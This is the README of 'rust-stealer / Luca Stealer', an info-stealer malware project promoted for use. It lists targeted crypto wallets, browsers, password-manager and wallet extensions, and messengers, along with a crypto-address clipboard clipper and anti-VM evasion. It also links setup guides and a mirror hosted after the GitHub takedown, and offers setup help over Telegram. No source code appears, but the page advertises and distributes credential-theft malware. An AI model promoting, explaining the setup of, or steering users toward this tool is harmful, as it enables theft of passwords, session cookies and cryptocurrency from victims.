## rust-stealer / Luca Stealer
Huge Thanks to Github for taking down my repo.
Also Thanks to Makusu for hosting a mirror.

## How to setup?
https://git.makusu.cc/makusu/rust-stealer/wiki/Installation

# Functions:
### Wallet Stealer
  - AtomicWallet
  - Exodus
  - Electrum
  - Ethereum
  - Guarda
  - Coinomi
  - Armory
  - ZCash
  - JaxxWallet
  - ByteCoin

------------

### Chromium Stealer
	edge
	chromium
	7star
	amigo
	brave
	centbrowser
	chedot
	chrome_canary
	coccoc
	dragon
	elements-browser
	epic-privacy-browser
	chrome
	kometa
	orbitum
	sputnik
	torchne
	ucozmedia
	vivaldi
	atom-mailru:
	operane
	opera-gx
	ChromePlus
	Iridium
	Iridium
	fenrir-inc
	catalinagroup
	Coowoo
	liebao
	qip-surf
	360browser

------------


### FireFox Stealer
  - Steals Passwords & Cookies from Firefox profiles.
------------

### Clipper
- XMR
- BNB
- TRX
- ETH
- BTC
- DOGE
- BCH
- LTC
- DASH
- XRP
- ADA
- TON
- NEO
- ETC
- SOL
- ZEC
- ALGO
- XLM
- IBAN

------------
### Browser Addon Stealer
	-EOS Authenticator
	-Bitwarden
	-KeePassXC
	-Dashlane
	-1Password
	-NordPass
	-Keeper
	-RoboForm
	-LastPass
	-BrowserPass
	-MYKI
	-Splikity
	-CommonKey
	-Zoho Vault
	-Norton Password Manager
	-Avira Password Manaager
	-Trezor Password Manager
	-MetaMask
	-TronLink
	-BinanceChain
	-Coin98
	-iWallet
	-Wombat
	-MEW CX
	-NeoLine
	-Terra Station
	-Keplr
	-Sollet
	-ICONex
	-KHC
	-TezBox
	-Byone
	-OneKey
	-DAppPlay
	-BitClip
	-Steem Keychain
	-Nash Extension
	-Hycon Lite Client
	-ZilPay
	-Leaf Wallet
	-Cyano Wallet
	-Cyano Wallet Pro
	-Nabox Wallet
	-Polymesh Wallet
	-Nifty Wallet
	-Liquality Wallet
	-Math Wallet
	-Coinbase Wallet
	-Clover Wallet
	-Yoroi
	-Guarda
	-EQUAL Wallet
	-BitApp Wallet
	-Auro Wallet
	-Saturn Wallet
	-Ronin Wallet
	-Exodus
	-Maiar DeFi Wallet
	-Nami
	-Eternl

------------
### Messenger Stealer
	- Discord
	- Element
	- ICQ
	- Skype
	- Telegram
### Other Stealer

- Sensitive Files
- Steam
- UPlay
- Simple Anti VM


## Write Up's about the stealer
https://gitlab.com/Lxca364/rust-stealer/-/wikis/Write-Up's
or
https://git.makusu.cc/makusu/rust-stealer/wiki/Write-Up%27s


## I need help setting it up

Write me https://t.me/Lxca1337
